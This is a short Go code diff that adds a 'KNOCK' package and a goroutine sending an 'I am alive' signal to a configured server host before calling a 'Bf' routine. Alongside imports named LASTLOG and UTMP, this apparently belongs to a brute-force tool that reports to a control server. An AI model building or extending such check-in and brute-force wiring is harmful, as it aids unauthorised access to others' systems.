@@ -15,6 +15,7 @@ import (
 	bf "test/BF"
 	check "test/CHECK"
 	getpty "test/GETPTY"
+	knock "test/KNOCK"
 	lastlog "test/LASTLOG"
 	utmp "test/UTMP"
 	vars "test/VARS"
@@ -128,6 +129,8 @@ func main() {
 
 			}
 		}
+		delay := 500 * time.Millisecond
+		go knock.SendIAmAlive(conf.Server.Host, 2, delay)
 		// if false {
 		bf.Bf(conf) //
 		// }
